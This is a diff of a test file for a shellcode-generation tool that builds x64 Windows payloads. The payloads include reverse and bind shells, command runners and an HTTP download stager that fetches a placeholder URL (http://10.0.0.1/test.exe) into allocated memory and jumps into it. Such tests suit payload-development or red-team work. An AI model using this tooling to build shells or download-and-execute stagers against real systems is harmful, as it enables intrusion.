@@ -5,20 +5,19 @@ import re
 
 import pytest
 
+from emitrion.api_database import API_DATABASE, STRUCT_DATABASE, STRUCT_DATABASE_X64
 from emitrion.payload_templates.base import TemplateConfig
 from emitrion.schema import Manifest, StringEntry, VariableEntry
 from emitrion.stack_alloc_x64 import StackLayoutX64, build_layout_x64
 from emitrion.workflow.ir import (
-    AllocateLocal,
     AllocateStruct,
     Block,
     CallAPI,
+    CallBuffer,
     Compare,
     ConstructString,
-    DefineConstant,
     Immediate,
     Input,
-    Jump,
     NameRef,
     SuccessPredicate,
     Terminate,
@@ -27,14 +26,18 @@ from emitrion.workflow.ir import (
     ZeroStruct,
 )
 from emitrion.workflow.reference import (
+    IRGetUsernameTemplate,
+    IRHttpDownloadTemplate,
+    IRMoveFileTemplate,
     WorkflowTemplate,
-    build_run_command_workflow,
-    build_reverse_shell_workflow,
     build_bind_shell_workflow,
-    build_copy_file_workflow,
+    build_get_username_workflow,
+    build_http_download_workflow,
+    build_move_file_workflow,
+    build_reverse_shell_workflow,
+    build_run_command_workflow,
 )
 from emitrion.workflow.x64_backend import lower_workflow_x64
-from emitrion.api_database import API_DATABASE, STRUCT_DATABASE, STRUCT_DATABASE_X64
 
 
 def _x64_config(**kwargs) -> TemplateConfig:
@@ -71,8 +74,8 @@ def _auto_layout_x64(
     Mimics what the build pipeline does: probe_slots auto-discovers APIs,
     variables, strings, and structs needed by the workflow.
     """
-    from emitrion.workflow.reference import WorkflowTemplate
     from emitrion.api_database import MODULE_LOAD_ORDER
+    from emitrion.workflow.reference import WorkflowTemplate
 
     w = workflow_builder() if callable(workflow_builder) else workflow_builder
     tmpl = WorkflowTemplate(w)
@@ -362,8 +365,9 @@ class TestX64BindShellWorkflow:
 
 class TestX64EndToEnd:
     def test_build_x64_run_command(self) -> None:
-        from emitrion.build_x64 import build_x64
         import pathlib
+
+        from emitrion.build_x64 import build_x64
         manifest_path = str(
             pathlib.Path(__file__).parent.parent / "manifests" / "x64" / "run_command_x64.yaml"
         )
@@ -375,8 +379,9 @@ class TestX64EndToEnd:
         assert "x64" in result.contract_md
 
     def test_build_x64_revshell(self) -> None:
-        from emitrion.build_x64 import build_x64
         import pathlib
+
+        from emitrion.build_x64 import build_x64
         manifest_path = str(
             pathlib.Path(__file__).parent.parent / "manifests" / "x64" / "revshell_x64.yaml"
         )
@@ -389,8 +394,9 @@ class TestX64EndToEnd:
         assert "KS_MODE_64" in result.debug_runner
 
     def test_build_dispatch_routes_x64(self) -> None:
-        from emitrion.build import build
         import pathlib
+
+        from emitrion.build import build
         manifest_path = str(
             pathlib.Path(__file__).parent.parent / "manifests" / "x64" / "run_command_x64.yaml"
         )
@@ -408,3 +414,177 @@ class TestX64SchemaArch:
             badchars=set(), functions=[], strings=[],
         )
         assert m.arch == "x86"
+
+
+# ---------------------------------------------------------------------------
+# CallBuffer IR node lowering (x64)
+# ---------------------------------------------------------------------------
+
+
+class TestX64CallBufferLowering:
+    def test_call_buffer_emits_jmp(self) -> None:
+        from emitrion.stack_alloc_x64 import SlotX64, StackLayoutX64
+        from emitrion.workflow.x64_backend import _LoweringContextX64
+
+        layout = StackLayoutX64([
+            SlotX64(name="virt_buf", offset=0x100, size=8, category="variable"),
+        ], frame_size=0x200)
+        ctx = _LoweringContextX64(layout, set(), None)
+        op = CallBuffer("virt_buf")
+        lines = ctx._lower_call_buffer(op)
+        asm = "\n".join(lines)
+        assert "jmp  rax" in asm
+        assert "virt_buf" in asm
+
+    def test_call_buffer_loads_from_rsp(self) -> None:
+        from emitrion.stack_alloc_x64 import SlotX64, StackLayoutX64
+        from emitrion.workflow.x64_backend import _LoweringContextX64
+
+        layout = StackLayoutX64([
+            SlotX64(name="buf", offset=0x90, size=8, category="variable"),
+        ], frame_size=0x200)
+        ctx = _LoweringContextX64(layout, set(), None)
+        op = CallBuffer("buf")
+        lines = ctx._lower_call_buffer(op)
+        asm = "\n".join(lines)
+        assert "rsp" in asm
+        assert "jmp  rax" in asm
+
+    def test_call_buffer_is_terminal(self) -> None:
+        from emitrion.workflow.x64_backend import _is_terminal
+
+        block = Block("exec", (
+            CallBuffer("buf"),
+        ))
+        assert _is_terminal(block) is True
+
+    def test_call_buffer_in_full_workflow(self) -> None:
+        from emitrion.stack_alloc_x64 import SlotX64, StackLayoutX64
+
+        layout = StackLayoutX64([
+            SlotX64(name="buf", offset=0x100, size=8, category="variable"),
+        ], frame_size=0x200)
+        w = Workflow(
+            name="stager_test_x64",
+            entry="entry",
+            blocks=(
+                Block("entry", (
+                    CallBuffer("buf"),
+                )),
+            ),
+        )
+        asm = lower_workflow_x64(w, layout, {0x00})
+        assert "jmp  rax" in asm
+        assert "wf_entry:" in asm
+
+
+# ---------------------------------------------------------------------------
+# x64 move_file, get_username, http_download workflows
+# ---------------------------------------------------------------------------
+
+
+class TestX64MoveFileWorkflow:
+    def test_workflow_is_valid(self) -> None:
+        from emitrion.workflow.validator import validate
+        w = build_move_file_workflow()
+        result = validate(w)
+        assert result.valid, result.errors
+
+    def test_probe_slots(self) -> None:
+        tmpl = IRMoveFileTemplate()
+        config = _x64_config(src_path=r"C:\a.txt", dst_path=r"C:\b.txt")
+        slots = tmpl.probe_slots(config)
+        assert "MoveFileA" in slots
+
+    def test_lowering(self) -> None:
+        config = _x64_config(src_path=r"C:\a.txt", dst_path=r"C:\b.txt")
+        layout, w = _auto_layout_x64(build_move_file_workflow, config)
+        asm = lower_workflow_x64(w, layout, {0x00, 0x0A, 0x0D}, config)
+        assert "MoveFileA" in asm
+        assert "wf_entry:" in asm
+
+
+class TestX64MoveFileEndToEnd:
+    def test_build_x64_move_file(self) -> None:
+        import pathlib
+        from emitrion.build_x64 import build_x64
+        manifest_path = str(
+            pathlib.Path(__file__).parent.parent / "manifests" / "x64" / "move_file_x64.yaml"
+        )
+        result = build_x64(manifest_path, assemble=False)
+        assert result.asm
+        assert "[BITS 64]" in result.asm
+        assert "MoveFileA" in result.asm
+
+
+class TestX64GetUsernameWorkflow:
+    def test_workflow_is_valid(self) -> None:
+        from emitrion.workflow.validator import validate
+        w = build_get_username_workflow()
+        result = validate(w)
+        assert result.valid, result.errors
+
+    def test_probe_slots(self) -> None:
+        tmpl = IRGetUsernameTemplate()
+        config = _x64_config(command="whoami")
+        slots = tmpl.probe_slots(config)
+        assert "GetUserNameA" in slots
+        assert "WinExec" in slots
+
+    def test_lowering(self) -> None:
+        config = _x64_config(command="whoami")
+        layout, w = _auto_layout_x64(build_get_username_workflow, config)
+        asm = lower_workflow_x64(w, layout, {0x00, 0x0A, 0x0D}, config)
+        assert "GetUserNameA" in asm
+        assert "wf_entry:" in asm
+
+
+class TestX64GetUsernameEndToEnd:
+    def test_build_x64_get_username(self) -> None:
+        import pathlib
+        from emitrion.build_x64 import build_x64
+        manifest_path = str(
+            pathlib.Path(__file__).parent.parent / "manifests" / "x64" / "get_username_x64.yaml"
+        )
+        result = build_x64(manifest_path, assemble=False)
+        assert result.asm
+        assert "[BITS 64]" in result.asm
+        assert "GetUserNameA" in result.asm
+
+
+class TestX64HttpDownloadWorkflow:
+    def test_workflow_is_valid(self) -> None:
+        from emitrion.workflow.validator import validate
+        w = build_http_download_workflow()
+        result = validate(w)
+        assert result.valid, result.errors
+
+    def test_probe_slots(self) -> None:
+        tmpl = IRHttpDownloadTemplate()
+        config = _x64_config(url="http://10.0.0.1/test.exe")
+        slots = tmpl.probe_slots(config)
+        assert "InternetOpenA" in slots
+        assert "InternetOpenUrlA" in slots
+        assert "VirtualAlloc" in slots
+
+    def test_lowering(self) -> None:
+        config = _x64_config(url="http://10.0.0.1/test.exe")
+        layout, w = _auto_layout_x64(build_http_download_workflow, config)
+        asm = lower_workflow_x64(w, layout, {0x00, 0x0A, 0x0D}, config)
+        assert "InternetOpenA" in asm
+        assert "InternetReadFile" in asm
+        assert "wf_entry:" in asm
+
+
+class TestX64HttpDownloadEndToEnd:
+    def test_build_x64_http_download(self) -> None:
+        import pathlib
+        from emitrion.build_x64 import build_x64
+        manifest_path = str(
+            pathlib.Path(__file__).parent.parent / "manifests" / "x64" / "http_download_x64.yaml"
+        )
+        result = build_x64(manifest_path, assemble=False)
+        assert result.asm
+        assert "[BITS 64]" in result.asm
+        assert "InternetOpenA" in result.asm
+        assert "wininet.dll" in result.asm
